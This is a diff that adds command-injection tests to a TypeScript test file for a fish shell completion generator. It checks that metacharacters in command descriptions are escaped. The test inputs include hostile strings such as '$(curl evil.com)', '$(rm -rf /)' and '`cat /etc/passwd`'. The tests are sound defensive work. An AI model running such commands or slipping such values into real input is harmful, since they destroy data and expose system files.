@@ -427,4 +427,106 @@ describe('FishGenerator', () => {
       expect(script).toContain("'Display dashboard'");
     });
   });
+
+  describe('security - command injection prevention', () => {
+    it('should escape $() command substitution in descriptions', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: 'Test command $(curl evil.com)',
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should contain escaped dollar signs to prevent command substitution
+      expect(script).toContain('\\$');
+      // Should have backslash before $( to escape it
+      expect(script).toMatch(/\\\$\(curl/);
+    });
+
+    it('should escape backticks in descriptions', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: 'Test command `whoami`',
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should not contain unescaped backticks
+      expect(script).not.toMatch(/`whoami`/);
+      // Should contain escaped version
+      expect(script).toContain('\\`');
+    });
+
+    it('should escape dollar signs in descriptions', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: 'Test with $variable',
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should escape dollar signs
+      expect(script).toContain('\\$');
+    });
+
+    it('should escape single quotes in descriptions', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: "Test with 'quotes'",
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should escape single quotes
+      expect(script).toContain("\\'");
+    });
+
+    it('should escape backslashes in descriptions', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: 'Test with \\ backslash',
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should contain escaped backslashes
+      expect(script).toContain('\\\\');
+    });
+
+    it('should handle multiple shell metacharacters together', () => {
+      const commands: CommandDefinition[] = [
+        {
+          name: 'test',
+          description: "Dangerous: $(rm -rf /) `cat /etc/passwd` $HOME 'quoted'",
+          flags: [],
+        },
+      ];
+
+      const script = generator.generate(commands);
+
+      // Should contain escaped versions of dangerous patterns
+      expect(script).toContain('\\$');  // Escaped dollar signs
+      expect(script).toContain('\\`');  // Escaped backticks
+      expect(script).toContain("\\'");  // Escaped single quotes
+
+      // The escaped patterns should be present (backslash before dangerous chars)
+      expect(script).toMatch(/\\\$\(/);  // \$( instead of $(
+      expect(script).toMatch(/\\\`cat/);  // \`cat instead of `cat
+    });
+  });
 });
